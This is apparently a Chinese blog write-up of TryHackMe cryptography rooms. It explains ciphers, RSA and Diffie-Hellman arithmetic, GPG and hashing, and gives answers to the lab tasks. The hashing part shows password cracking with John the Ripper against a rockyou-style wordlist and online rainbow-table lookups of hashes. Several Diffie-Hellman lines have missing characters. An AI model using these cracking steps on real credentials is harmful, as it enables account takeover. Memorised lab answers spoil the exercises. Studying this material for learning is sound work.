来到了密码学专区了\n\n![title](/images/tryhackme-密码学基础/title1.png)\n\n密码学在生活中无处不在\n\n# cyptography basics\n来看看密码学的一些术语\n- 明文(Plaintext)是加密前的原始可读消息或数据。它可以是文档、图像、多媒体文件或任何其他二进制数据。\n  \n- 密文(Ciphertext)是加密后的消息的混乱且不可读的版本。理想情况下，我们无法获得有关原始明文的任何信息，除了其大致大小。\n  \n- 密码(Cipher)是一种将明文转换为密文并再转换回明文的算法或方法。密码通常由数学家开发。\n  \n- 密钥(Key )是密码用于加密或解密数据的一串位。一般来说，使用的密码是公开的；但是，除非密钥是非对称加密中的公钥，否则它必须保密。我们将在后面的任务中讨论非对称加密。\n  \n- 加密(Encryption)是使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。\n  \n- 解密(Decryption)是加密的逆过程，使用密码和密钥将密文重新转换为明文。尽管密码是公开的，但在不知道密钥的情况下恢复明文应该是不可能的（不可行）\n\n来看看加密和解密的图解\n\n此为加密\n![task](/images/tryhackme-密码学基础/en.png)\n\n\n此为解密\n![task](/images/tryhackme-密码学基础/de.png)\n\n## task3\n\n看两个问题\n\n![task3](/images/tryhackme-密码学基础/task3.png)\n\n第一个 毋庸置疑 密文(ciphertext)\n\n第二个 转化为明文就是解密\n\n## task4\n凯撒密码 顾名思义就是凯撒搞出来的加密方法 将每个字母移动一定数字来加密消息\n\n分为明文 偏移量 密码 \n举例：\n- 假设明文为ikun\n- 偏移量为3(像右3个字母)\n- 密码为lnxq\n\n假设知道密文和偏移量 也能倒推出明文\n\n来试试看吧\n\n![task4](/images/tryhackme-密码学基础/task4.png)\n\n可以试试这个[网站](https://www.dcode.fr/caesar-cipher) 相信很多师傅都有这种密码破解的 一下子梭出来了\n\n![task](/images/tryhackme-密码学基础/depy.png)\n\n第一个就是答案\n\n## 加密类型\n分为对称加密和非对称加密\n\n对称加密，使用相同的密钥来加密和解密数据，\n\n特点：\n- 密钥相同：发送和接收双方共享一个密钥，因此加密和解密过程都依赖于相同的密钥。\n- 速度较快：对称加密算法通常计算速度较快，适用于加密大量数据。\n- 密钥管理问题：因为密钥是共享的，密钥的分发和管理需要非常小心，密钥一旦泄漏，所有加密的数据都可能被破解\n\n常用的对称加密DES 3DES AES RC4\n\n![task](/images/tryhackme-密码学基础/duicheng.png)\n\n非对称加密\n又称公钥加密\n非对称加密使用一对密钥：公钥（Public Key）和 私钥（Private Key）。公钥用于加密，私钥用于解密。加密和解密使用不同的密钥。\n\n- 加密：发送方使用接收方的公钥对数据进行加密。\n- 解密：接收方使用自己的私钥对数据进行解密。\n\n特点：\n- 密钥不同：加密和解密使用不同的密钥，其中公钥可以公开，而私钥必须保密。\n- 安全性高：即使公钥被泄露，也无法通过公钥解密数据，只有私钥能解密。\n- 速度较慢：由于非对称加密算法的计算复杂度较高，因此相对于对称加密，非对称加密速度较慢，通常用于加密少量数据，如传输密钥。\n\n常见的非对称加密有RSA DSA Diffie-Hellman ecc\n\n## 基础计算\n异或计算\n\nXOR是“异或”的缩写，是二进制算术中的逻辑运算，在各种计算和加密应用中起着至关重要的作用。在二进制中，XOR比较两个位，如果位不同则返回 1，如果位相同则返回0，\n\n\n我们要对二进制数 1010 和 1100 进行异或运算。在这种情况下，我们逐位执行操作：1 ⊕ 1 = 0、0 ⊕ 1 = 1、1 ⊕ 0 = 1 和 0 ⊕ 0 = 0，结果为 0110。\n\n模运算 \n\n步骤：\n- 除法运算：将 a 除以 b。\n- 求余数：计算除法后的余数。\n\n例子 2：15 % 4\n除法运算：15 ÷ 4 = 3，商是 3。\n求余数：15 - (4 × 3) = 15 - 12 = 3，所以 15 % 4 = 3。\n\n![task6](/images/tryhackme-密码学基础/task6.png)\n\n异或计算就是每个相对应的位数 分别计算 相同为0 不同为1\n\n1⊕1=0 \n0⊕0=0\n0⊕1=1\n1⊕0=1\n\n第一问答案就是0011\n\n第二问可以到[这里](https://www.wolframalpha.com/)计算\n\n第三问 因为60可以与12整除 余数为0\n\n# Public Key Cryptography Basics\n![task](/images/tryhackme-密码学基础/public%20key/public%20key.png)\n\n网络通信中要注意\n- 身份验证：确保与正确的人进行交流，而不是与其他人假装的交流。\n- 真实性：可以验证信息是否来自所声称的来源。\n- 完整性：必须确保没有人更改您交换的数据。\n- 保密性：想防止未经授权的一方窃听您的谈话。\n\n这个章节主要是讲公钥加密 也就是非对称加密\n\n## task2\n非对称加密其实就有点像你放了一个信到一个上锁的信箱里面。每个人都可以放信进去 但是只有你才能打开信箱的锁拿出信来看内容\n\n公钥就是信箱的投递口\n私钥就是取信的钥匙\n\n## task3\n来认识认识rsa\n\nrsa的计算过程\n1. Bob 选择了两个素数：p  = 157和q  = 199。他计算出n  =  p  ×  q  = 31243。\n2. 假设ϕ ( n ) =  n  −  p  −  q  + 1 = 31243 − 157 − 199 + 1 = 30888，Bob 选择e  = 163 ，使得e与ϕ ( n )互质；此外，他选择d  = 379，其中e  ×  d  = 1 mod ϕ ( n )，即e  ×  d  = 163 × 379 = 61777且61777 mod 30888 = 1。公钥为( n , e )，即(31243,163)，私钥为 $(n,d) ，即(31243,379)。\n3. 假设他们想要加密的值是x  = 13，那么 Alice 将计算并发送y  =  x e mod n  = 13 163 mod 31243 = 16341。\n4. Bob 将通过计算x  =  y d mod n  = 16341 379 mod 31243 = 13来解密收到的值。这样，Bob 就恢复了 Alice 发送的值。\n\n\n\n看看问题\n\n![task3](/source/images/tryhackme-密码学基础/public%20key/task3.png)\n\n也是醉了 出了个寂寞\n\n第一问就是4391*6659=29239669\n\n第二问就是29239669-4391-6659+1=29228620\n\n分别是第一步和第二步的开头\n\n\n## task4 \nDiffie-Hellman Key Exchange 简称就叫dh协议 密钥交换\n\n密钥交换旨在在双方之间建立共享秘密。这是一种允许双方在非安全通信信道上建立共享秘密的方法，无需预先存在共享秘密，观察者也无法获取此密钥。因此，此共享密钥可用于后续通信中的对称加密。\n\n研究一下具体的过程。\n\n步骤 1: 公共材料\nAlice 和 Bob 确定一个公共的素数p 和一个公共的生成器g，这两者对双方都是公开的。假设我们选择：\np = 29（一个素数）\ng = 3（生成器）\n这些值是公开的，任何人都可以知道它们。\n\n步骤 2: Alice 和 Bob 各自选择私钥\nAlice 选择一个私钥 a，并且不能告诉别人。假设 Alice 选择了私钥 a = 13。\nBob 选择一个私钥 b，并且也不会告诉别人。假设 Bob 选择了私钥 b = 15。\n这些私钥是保密的，只由 Alice 和 Bob 知道。\n\n步骤 3: 计算公钥\n根据 Diffie-Hellman 的规则，每个人使用自己的私钥来计算公钥：\n\nAlice 的公钥：A = g^a mod p\nA = 3^13 mod 29\n计算 3^13 mod 29：\n3^13 = 1594323，\n然后 A mod p \n1594323 mod 29 = 19\n所以 Alice 的公钥是 A = 19。\n\nBob 的公钥：B = g^b mod p\nB = 3^15 mod 29\n计算 3^15 mod 29：\n3^15 = 14348907，\n然后 B mod p \n 14348907 mod 29 = 26\n所以 Bob 的公钥是 B = 26。\n\n步骤 4: Alice 和 Bob 交换公钥\nAlice 发送自己的公钥 A = 19 给 Bob。\nBob 发送自己的公钥 B = 26 给 Alice。\n这时，Alice 和 Bob 都拥有对方的公钥。\n\n步骤 5: 计算共享密钥\nAlice 和 Bob 使用自己私有的密钥 的公钥来计算共享密钥：\n\nAlice 的计算：\nAlice 收到 Bob 的公钥 B = 26，然    算 B^a mod p：\nB^a mod p = 26^13 mod 29\n计算 26^13 mod 29：\n26^13 = 10460353203，然后 104603    mod 29 = 10\n所以 Alice 得到的共享密钥是 10。    \n\nBob 的计算：\nBob 收到 Alice 的公钥 A = 19，然    算 A^b mod p：\nA^b mod p = 19^15 mod 29\n计算 19^15 mod 29：\n19^15 = 41821194261，然后 418211    mod 29 = 10\n所以 Bob 得到的共享密钥是 10。\n\n步骤 6: 完成\n最终，Alice 和 Bob 都得到了相同 密钥 10，并且可以用它来进行后续的加密通信。\n\n看看图解\n\n![dh](/source/images/tryhackme-密码学基础/public%20key/dh.png)\n\n\n来练练手\n\n![dh](/source/images/tryhackme-密码学基础/public%20key/task4.png)\n\n三四问可以在[这里](https://www.wolframalpha.com/)进行计算\n\n第一问\np=29\ng=5\na=12\n\nA = g^a mod p\nA = 5^12 mod 29\nA = 244140625 mod 29 = 7\n\n第二问 一样\nb=17 \n其他都一样\nB = g^b mod p\nB = 5^17 mod 29 = 9\n\n第三问\n已知p  = 29，a  = 12，并且从第二个问题得到B，那么 Bob 计算出的密钥是什么？ \n\nkey = B^a mod p \nkey = 9^ 12 mod 29 =24\n\n第四问\n已知p  = 29，b  = 17，并且从第一个问题得到A，那么 Alice 计算出的密钥是什么？\n\nkey = A^b mod p\nkey = 7^17 mod 29 =24\n\n\n## task5\n讲的是ssh秘钥\n\n\n![task5](/source/images/tryhackme-密码学基础/public%20key/rsa.png)\n\n![task5](/source/images/tryhackme-密码学基础/public%20key/task5.png)\n\n## task6\n数字签名和证书\n数字签名提供了一种验证数字消息或文档真实性和完整性的方法。数字签名和物理签名​​具有相同的法律效力。\n\n证书是公钥加密技术的一个重要应用，它们也与数字签名相关。它们最常用于 HTTPS\n\n证书有一个信任链，从根 CA（证书颁发机构）开始。\n\n问题就跳过了 文章都是可以找到的\n\n## task7\nPGP和GPG\nPGP代表 Pretty Good Privacy。它是一种实现加密的软件，用于加密文件、执行数字签名等。GnuPG或GPG是 OpenPGP 标准的开源实现。\n\n看看问题\n\n![task77](/source/images/tryhackme-密码学基础/public%20key/task77.png)\n\n需要我们导入密钥 然后解密就可以了\n\n![task7](/source/images/tryhackme-密码学基础/public%20key/task7.png)\n\n```\ngpg --import tryhackme.key\ngpg --decrypt message.gpg\n```\n\n到此第二部分也简单介绍到这里\n\n# Hashing Basics\n哈希值是由哈希函数计算的固定大小的字符串或字符。哈希函数接受任意大小的输入并返回固定长度的输出，即哈希值。\n\n我们也能通过对比hash值来判断下载的副本是否与原始文件完全相同\n\n## task2\n### 什么是哈希函数\n\n哈希函数不同于加密。它没有密钥，并且不可能（或计算上不切实际）从输出返回到输入。输出具有固定大小。\n\n### 什么是哈希碰撞\n\n哈希碰撞是指两个不同的输入产生相同的输出。\n\n### 题\n来看看题\n\n![task2](/images/tryhackme-密码学基础/hash/task2.png)\n\n第一问问照片的sha256值\n\n```\nsha256sum passport.jpg\n```\n来获得照片的sha256的值\n\n第二问\nmd5能输出一个128位(16字节)的散列值 答案就是16\n\n第三问\n八位hash输出 可以当成2^8=256\n\n## task3\n身份验证的密码存储不安全\n\n密码方面的三种不安全做法：\n- 以明文形式存储密码\n- 使用已弃用的加密方式存储密码\n- 使用不安全的哈希算法存储密码\n\n这个问就是找密码\n\n![task3](/images/tryhackme-密码学基础/hash/task3.png)\n\n问第20个密码是啥 直接head 查到第二十个就行了\n\n```\nhead -n 20 rockyou.txt\n```\n\n![task3](/images/tryhackme-密码学基础/hash/mima.png)\n\n## task4\n使用哈希存储密码\n\nRainbow Table 彩虹表(彩虹表是哈希到明文的查找表) 因此您可以从哈希中快速找出用户刚刚拥有的密码。\n\n[crackstation](https://crackstation.net/) 和[hashes.com](https://hashes.com/en/decrypt/hash)能给我们帮助\n内部使用大量彩虹表来提供快速破解无盐哈希密码的功能。\n\n这个时候要提一嘴了 什么是加盐\n\n加盐是指在加密过程中，向原始数据（通常是密码）中添加一个随机生成的字符串（即“盐”），然后再进行加密。\n\n这个随机字符串通常是唯一的，并且与原始数据一起存储。 加盐的目的是增加加密数据的复杂性，使得即使两个相同的密码，其加密结果也会不同。\n\n![task4](/images/tryhackme-密码学基础/hash/task4.png)\n\n问题一\n我们能在上面的表上查到\n\n![task4](/images/tryhackme-密码学基础/hash/caihong.png)\n\n问题二\n\n我们把hash值复制到[hashes.com](https://hashes.com/en/decrypt/hash)能破解出结果\n\n![task4](/images/tryhackme-密码学基础/hash/tryhackme.png)\n\n\n## task5\n识别密码哈希值\n\n在Linux上，密码哈希存储在 中/etc/shadow，通常只有 root 才能读取。它们过去存储在 中/etc/passwd，每个人都可以读取。\n\n该shadow文件包含密码信息。每行包含九个字段，以冒号 ( :) 分隔。前两个字段是登录名和加密密码。\n\n加密密码字段包含哈希密码，该密码由四个部分组成：前缀（算法 ID）、选项（参数）、盐和哈希。\n\n![task5](/images/tryhackme-密码学基础/hash/task5.png)\n\n第一问遇事不决直接百度 能查出是256的大小\n\n第二问和第三问 我们在[Hashcat 示例](https://hashcat.net/wiki/doku.php?id=example_hashes)能找到我们要的答案\n\n第二问\n\n![task5](/images/tryhackme-密码学基础/hash/2410.png)\n\n![task5](/images/tryhackme-密码学基础/hash/scrypt.png)\n\n## task6\n密码破解\n\n可以在[hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)和[John the Ripper](https://www.openwall.com/john/)这两个工具上\n\n第一个最好在主机上搞 榨干全部性能\n\n[哈希分析](https://www.tunnelsup.com/hash-analyzer/)\n\n来试试手\n\n![task6](/images/tryhackme-密码学基础/hash/task6.png)\n\n第一问\n我们用john来破解 \n$2a$就是bcrypt\n```\njohn hash.txt -format=bcrypt -wordlist=/usr/share/wordlists\n```\n![task6](/images/tryhackme-密码学基础/hash/850.png)\n\n能破解出85208520\n\n第二 三 四问 我们都可以在[这里](https://hashes.com/en/decrypt/hash)去破解\n\n主要是不知道为啥这个机子的john很抽象 就只能在网站那破解\n\n![task6](/images/tryhackme-密码学基础/hash/holl.png)\n\n![task6](/images/tryhackme-密码学基础/hash/spaceman.png)\n\n![task6](/images/tryhackme-密码学基础/hash/funforyou.png)\n\n## task7\n![task7](/images/tryhackme-密码学基础/hash/task7.png)\n\n第一问\n```\nsha256sum \n```\n![task7](/images/tryhackme-密码学基础/hash/2561.png)\n\n第二问\n![task7](/images/tryhackme-密码学基础/hash/512.png)\n\n\n## task8\n使用base64解码RU5jb2RlREVjb2RlCg==\n\n把这串复制到[cyberchef](https://gchq.github.io/CyberChef/)里面能得出解码：ENcodeDEcode\n\n第三部分就这样结束了 后面还会补充多点内容 ","source":"_posts/tryhackme-密码学基础.md","raw":"---\ntitle: tryhackme 密码学基础\ndate: 2025-02-10 11:10:37\ntags: 密码学\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/14/ZeGbcFxgUvfNqP1.jpg\n---\n\n话说回来 来到了密码学专区了\n\n![title](/images/tryhackme-密码学基础/title1.png)\n\n密码学在生活中无处不在\n\n# cyptography basics\n来看看密码学的一些术语\n- 明文(Plaintext)是加密前的原始可读消息或数据。它可以是文档、图像、多媒体文件或任何其他二进制数据。\n  \n- 密文(Ciphertext)是加密后的消息的混乱且不可读的版本。理想情况下，我们无法获得有关原始明文的任何信息，除了其大致大小。\n  \n- 密码(Cipher)是一种将明文转换为密文并再转换回明文的算法或方法。密码通常由数学家开发。\n  \n- 密钥(Key )是密码用于加密或解密数据的一串位。一般来说，使用的密码是公开的；但是，除非密钥是非对称加密中的公钥，否则它必须保密。我们将在后面的任务中讨论非对称加密。\n  \n- 加密(Encryption)是使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。\n  \n- 解密(Decryption)是加密的逆过程，使用密码和密钥将密文重新转换为明文。尽管密码是公开的，但在不知道密钥的情况下恢复明文应该是不可能的（不可行）\n\n来看看加密和解密的图解\n\n此为加密\n![task](/images/tryhackme-密码学基础/en.png)\n\n\n此为解密\n![task](/images/tryhackme-密码学基础/de.png)\n\n## task3\n\n看两个问题\n\n![task3](/images/tryhackme-密码学基础/task3.png)\n\n第一个 毋庸置疑 密文(ciphertext)\n\n第二个 转化为明文就是解密\n\n## task4\n凯撒密码 顾名思义就是凯撒搞出来的加密方法 将每个字母移动一定数字来加密消息\n\n分为明文 偏移量 密码 \n举例：\n- 假设明文为ikun\n- 偏移量为3(像右3个字母)\n- 密码为lnxq\n\n假设知道密文和偏移量 也能倒推出明文\n\n来试试看吧\n\n![task4](/images/tryhackme-密码学基础/task4.png)\n\n可以试试这个[网站](https://www.dcode.fr/caesar-cipher) 相信很多师傅都有这种密码破解的 一下子梭出来了\n\n![task](/images/tryhackme-密码学基础/depy.png)\n\n第一个就是答案\n\n## 加密类型\n分为对称加密和非对称加密\n\n对称加密，使用相同的密钥来加密和解密数据，\n\n特点：\n- 密钥相同：发送和接收双方共享一个密钥，因此加密和解密过程都依赖于相同的密钥。\n- 速度较快：对称加密算法通常计算速度较快，适用于加密大量数据。\n- 密钥管理问题：因为密钥是共享的，密钥的分发和管理需要非常小心，密钥一旦泄漏，所有加密的数据都可能被破解\n\n常用的对称加密DES 3DES AES RC4\n\n![task](/images/tryhackme-密码学基础/duicheng.png)\n\n非对称加密\n又称公钥加密\n非对称加密使用一对密钥：公钥（Public Key）和 私钥（Private Key）。公钥用于加密，私钥用于解密。加密和解密使用不同的密钥。\n\n- 加密：发送方使用接收方的公钥对数据进行加密。\n- 解密：接收方使用自己的私钥对数据进行解密。\n\n特点：\n- 密钥不同：加密和解密使用不同的密钥，其中公钥可以公开，而私钥必须保密。\n- 安全性高：即使公钥被泄露，也无法通过公钥解密数据，只有私钥能解密。\n- 速度较慢：由于非对称加密算法的计算复杂度较高，因此相对于对称加密，非对称加密速度较慢，通常用于加密少量数据，如传输密钥。\n\n常见的非对称加密有RSA DSA Diffie-Hellman ecc\n\n## 基础计算\n异或计算\n\nXOR是“异或”的缩写，是二进制算术中的逻辑运算，在各种计算和加密应用中起着至关重要的作用。在二进制中，XOR比较两个位，如果位不同则返回 1，如果位相同则返回0，\n\n\n我们要对二进制数 1010 和 1100 进行异或运算。在这种情况下，我们逐位执行操作：1 ⊕ 1 = 0、0 ⊕ 1 = 1、1 ⊕ 0 = 1 和 0 ⊕ 0 = 0，结果为 0110。\n\n模运算 \n\n步骤：\n- 除法运算：将 a 除以 b。\n- 求余数：计算除法后的余数。\n\n例子 2：15 % 4\n除法运算：15 ÷ 4 = 3，商是 3。\n求余数：15 - (4 × 3) = 15 - 12 = 3，所以 15 % 4 = 3。\n\n![task6](/images/tryhackme-密码学基础/task6.png)\n\n异或计算就是每个相对应的位数 分别计算 相同为0 不同为1\n\n1⊕1=0 \n0⊕0=0\n0⊕1=1\n1⊕0=1\n\n第一问答案就是0011\n\n第二问可以到[这里](https://www.wolframalpha.com/)计算\n\n第三问 因为60可以与12整除 余数为0\n\n# Public Key Cryptography Basics\n![task](/images/tryhackme-密码学基础/public%20key/public%20key.png)\n\n网络通信中要注意\n- 身份验证：确保与正确的人进行交流，而不是与其他人假装的交流。\n- 真实性：可以验证信息是否来自所声称的来源。\n- 完整性：必须确保没有人更改您交换的数据。\n- 保密性：想防止未经授权的一方窃听您的谈话。\n\n这个章节主要是讲公钥加密 也就是非对称加密\n\n## task2\n非对称加密其实就有点像你放了一个信到一个上锁的信箱里面。每个人都可以放信进去 但是只有你才能打开信箱的锁拿出信来看内容\n\n公钥就是信箱的投递口\n私钥就是取信的钥匙\n\n## task3\n来认识认识rsa\n\nrsa的计算过程\n1. Bob 选择了两个素数：p  = 157和q  = 199。他计算出n  =  p  ×  q  = 31243。\n2. 假设ϕ ( n ) =  n  −  p  −  q  + 1 = 31243 − 157 − 199 + 1 = 30888，Bob 选择e  = 163 ，使得e与ϕ ( n )互质；此外，他选择d  = 379，其中e  ×  d  = 1 mod ϕ ( n )，即e  ×  d  = 163 × 379 = 61777且61777 mod 30888 = 1。公钥为( n , e )，即(31243,163)，私钥为 $(n,d) ，即(31243,379)。\n3. 假设他们想要加密的值是x  = 13，那么 Alice 将计算并发送y  =  x e mod n  = 13 163 mod 31243 = 16341。\n4. Bob 将通过计算x  =  y d mod n  = 16341 379 mod 31243 = 13来解密收到的值。这样，Bob 就恢复了 Alice 发送的值。\n\n\n\n看看问题\n\n![task3](/source/images/tryhackme-密码学基础/public%20key/task3.png)\n\n也是醉了 出了个寂寞\n\n第一问就是4391*6659=29239669\n\n第二问就是29239669-4391-6659+1=29228620\n\n分别是第一步和第二步的开头\n\n\n## task4 \nDiffie-Hellman Key Exchange 简称就叫dh协议 密钥交换\n\n密钥交换旨在在双方之间建立共享秘密。这是一种允许双方在非安全通信信道上建立共享秘密的方法，无需预先存在共享秘密，观察者也无法获取此密钥。因此，此共享密钥可用于后续通信中的对称加密。\n\n研究一下具体的过程。\n\n步骤 1: 公共材料\nAlice 和 Bob 确定一个公共的素数p 和一个公共的生成器g，这两者对双方都是公开的。假设我们选择：\np = 29（一个素数）\ng = 3（生成器）\n这些值是公开的，任何人都可以知道它们。\n\n步骤 2: Alice 和 Bob 各自选择私钥\nAlice 选择一个私钥 a，并且不能告诉别人。假设 Alice 选择了私钥 a = 13。\nBob 选择一个私钥 b，并且也不会告诉别人。假设 Bob 选择了私钥 b = 15。\n这些私钥是保密的，只由 Alice 和 Bob 知道。\n\n步骤 3: 计算公钥\n根据 Diffie-Hellman 的规则，每个人使用自己的私钥来计算公钥：\n\nAlice 的公钥：A = g^a mod p\nA = 3^13 mod 29\n计算 3^13 mod 29：\n3^13 = 1594323，\n然后 A mod p \n1594323 mod 29 = 19\n所以 Alice 的公钥是 A = 19。\n\nBob 的公钥：B = g^b mod p\nB = 3^15 mod 29\n计算 3^15 mod 29：\n3^15 = 14348907，\n然后 B mod p \n 14348907 mod 29 = 26\n所以 Bob 的公钥是 B = 26。\n\n步骤 4: Alice 和 Bob 交换公钥\nAlice 发送自己的公钥 A = 19 给 Bob。\nBob 发送自己的公钥 B = 26 给 Alice。\n这时，Alice 和 Bob 都拥有对方的公钥。\n\n步骤 5: 计算共享密钥\nAlice 和 Bob 使用自己私有的密钥 的公钥来计算共享密钥：\n\nAlice 的计算：\nAlice 收到 Bob 的公钥 B = 26，然    算 B^a mod p：\nB^a mod p = 26^13 mod 29\n计算 26^13 mod 29：\n26^13 = 10460353203，然后 104603    mod 29 = 10\n所以 Alice 得到的共享密钥是 10。    \n\nBob 的计算：\nBob 收到 Alice 的公钥 A = 19，然    算 A^b mod p：\nA^b mod p = 19^15 mod 29\n计算 19^15 mod 29：\n19^15 = 41821194261，然后 418211    mod 29 = 10\n所以 Bob 得到的共享密钥是 10。\n\n步骤 6: 完成\n最终，Alice 和 Bob 都得到了相同 密钥 10，并且可以用它来进行后续的加密通信。\n\n看看图解\n\n![dh](/source/images/tryhackme-密码学基础/public%20key/dh.png)\n\n\n来练练手\n\n![dh](/source/images/tryhackme-密码学基础/public%20key/task4.png)\n\n三四问可以在[这里](https://www.wolframalpha.com/)进行计算\n\n第一问\np=29\ng=5\na=12\n\nA = g^a mod p\nA = 5^12 mod 29\nA = 244140625 mod 29 = 7\n\n第二问 一样\nb=17 \n其他都一样\nB = g^b mod p\nB = 5^17 mod 29 = 9\n\n第三问\n已知p  = 29，a  = 12，并且从第二个问题得到B，那么 Bob 计算出的密钥是什么？ \n\nkey = B^a mod p \nkey = 9^ 12 mod 29 =24\n\n第四问\n已知p  = 29，b  = 17，并且从第一个问题得到A，那么 Alice 计算出的密钥是什么？\n\nkey = A^b mod p\nkey = 7^17 mod 29 =24\n\n\n## task5\n讲的是ssh秘钥\n\n\n![task5](/source/images/tryhackme-密码学基础/public%20key/rsa.png)\n\n![task5](/source/images/tryhackme-密码学基础/public%20key/task5.png)\n\n## task6\n数字签名和证书\n数字签名提供了一种验证数字消息或文档真实性和完整性的方法。数字签名和物理签名​​具有相同的法律效力。\n\n证书是公钥加密技术的一个重要应用，它们也与数字签名相关。它们最常用于 HTTPS\n\n证书有一个信任链，从根 CA（证书颁发机构）开始。\n\n问题就跳过了 文章都是可以找到的\n\n## task7\nPGP和GPG\nPGP代表 Pretty Good Privacy。它是一种实现加密的软件，用于加密文件、执行数字签名等。GnuPG或GPG是 OpenPGP 标准的开源实现。\n\n看看问题\n\n![task77](/source/images/tryhackme-密码学基础/public%20key/task77.png)\n\n需要我们导入密钥 然后解密就可以了\n\n![task7](/source/images/tryhackme-密码学基础/public%20key/task7.png)\n\n```\ngpg --import tryhackme.key\ngpg --decrypt message.gpg\n```\n\n到此第二部分也简单介绍到这里\n\n# Hashing Basics\n哈希值是由哈希函数计算的固定大小的字符串或字符。哈希函数接受任意大小的输入并返回固定长度的输出，即哈希值。\n\n我们也能通过对比hash值来判断下载的副本是否与原始文件完全相同\n\n## task2\n### 什么是哈希函数\n\n哈希函数不同于加密。它没有密钥，并且不可能（或计算上不切实际）从输出返回到输入。输出具有固定大小。\n\n### 什么是哈希碰撞\n\n哈希碰撞是指两个不同的输入产生相同的输出。\n\n### 题\n来看看题\n\n![task2](/images/tryhackme-密码学基础/hash/task2.png)\n\n第一问问照片的sha256值\n\n```\nsha256sum passport.jpg\n```\n来获得照片的sha256的值\n\n第二问\nmd5能输出一个128位(16字节)的散列值 答案就是16\n\n第三问\n八位hash输出 可以当成2^8=256\n\n## task3\n身份验证的密码存储不安全\n\n密码方面的三种不安全做法：\n- 以明文形式存储密码\n- 使用已弃用的加密方式存储密码\n- 使用不安全的哈希算法存储密码\n\n这个问就是找密码\n\n![task3](/images/tryhackme-密码学基础/hash/task3.png)\n\n问第20个密码是啥 直接head 查到第二十个就行了\n\n```\nhead -n 20 rockyou.txt\n```\n\n![task3](/images/tryhackme-密码学基础/hash/mima.png)\n\n## task4\n使用哈希存储密码\n\nRainbow Table 彩虹表(彩虹表是哈希到明文的查找表) 因此您可以从哈希中快速找出用户刚刚拥有的密码。\n\n[crackstation](https://crackstation.net/) 和[hashes.com](https://hashes.com/en/decrypt/hash)能给我们帮助\n内部使用大量彩虹表来提供快速破解无盐哈希密码的功能。\n\n这个时候要提一嘴了 什么是加盐\n\n加盐是指在加密过程中，向原始数据（通常是密码）中添加一个随机生成的字符串（即“盐”），然后再进行加密。\n\n这个随机字符串通常是唯一的，并且与原始数据一起存储。 加盐的目的是增加加密数据的复杂性，使得即使两个相同的密码，其加密结果也会不同。\n\n![task4](/images/tryhackme-密码学基础/hash/task4.png)\n\n问题一\n我们能在上面的表上查到\n\n![task4](/images/tryhackme-密码学基础/hash/caihong.png)\n\n问题二\n\n我们把hash值复制到[hashes.com](https://hashes.com/en/decrypt/hash)能破解出结果\n\n![task4](/images/tryhackme-密码学基础/hash/tryhackme.png)\n\n\n## task5\n识别密码哈希值\n\n在Linux上，密码哈希存储在 中/etc/shadow，通常只有 root 才能读取。它们过去存储在 中/etc/passwd，每个人都可以读取。\n\n该shadow文件包含密码信息。每行包含九个字段，以冒号 ( :) 分隔。前两个字段是登录名和加密密码。\n\n加密密码字段包含哈希密码，该密码由四个部分组成：前缀（算法 ID）、选项（参数）、盐和哈希。\n\n![task5](/images/tryhackme-密码学基础/hash/task5.png)\n\n第一问遇事不决直接百度 能查出是256的大小\n\n第二问和第三问 我们在[Hashcat 示例](https://hashcat.net/wiki/doku.php?id=example_hashes)能找到我们要的答案\n\n第二问\n\n![task5](/images/tryhackme-密码学基础/hash/2410.png)\n\n![task5](/images/tryhackme-密码学基础/hash/scrypt.png)\n\n## task6\n密码破解\n\n可以在[hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)和[John the Ripper](https://www.openwall.com/john/)这两个工具上\n\n第一个最好在主机上搞 榨干全部性能\n\n[哈希分析](https://www.tunnelsup.com/hash-analyzer/)\n\n来试试手\n\n![task6](/images/tryhackme-密码学基础/hash/task6.png)\n\n第一问\n我们用john来破解 \n$2a$就是bcrypt\n```\njohn hash.txt -format=bcrypt -wordlist=/usr/share/wordlists\n```\n![task6](/images/tryhackme-密码学基础/hash/850.png)\n\n能破解出85208520\n\n第二 三 四问 我们都可以在[这里](https://hashes.com/en/decrypt/hash)去破解\n\n主要是不知道为啥这个机子的john很抽象 就只能在网站那破解\n\n![task6](/images/tryhackme-密码学基础/hash/holl.png)\n\n![task6](/images/tryhackme-密码学基础/hash/spaceman.png)\n\n![task6](/images/tryhackme-密码学基础/hash/funforyou.png)\n\n## task7\n![task7](/images/tryhackme-密码学基础/hash/task7.png)\n\n第一问\n```\nsha256sum \n```\n![task7](/images/tryhackme-密码学基础/hash/2561.png)\n\n第二问\n![task7](/images/tryhackme-密码学基础/hash/512.png)\n\n\n## task8\n使用base64解码RU5jb2RlREVjb2RlCg==\n\n把这串复制到[cyberchef](https://gchq.github.io/CyberChef/)里面能得出解码：ENcodeDEcode\n\n第三部分就这样结束了 后面还会补充多点内容 ","slug":"tryhackme-密码学基础","published":1,"updated":"2025-02-14T10:54:58.011Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxi000stsg69uc43mct","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>话说回来 来到了密码学专区了</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/title1.png\" alt=\"title\"></p>\n<p>密码学在生活中无处不在</p>\n<h1 id=\"cyptography-basics\"><a href=\"#cyptography-basics\" class=\"headerlink\" title=\"cyptography basics\"></a>cyptography basics</h1><p>来看看密码学的一些术语</p>\n<ul>\n<li><p>明文(Plaintext)是加密前的原始可读消息或数据。它可以是文档、图像、多媒体文件或任何其他二进制数据。</p>\n</li>\n<li><p>密文(Ciphertext)是加密后的消息的混乱且不可读的版本。理想情况下，我们无法获得有关原始明文的任何信息，除了其大致大小。</p>\n</li>\n<li><p>密码(Cipher)是一种将明文转换为密文并再转换回明文的算法或方法。密码通常由数学家开发。</p>\n</li>\n<li><p>密钥(Key 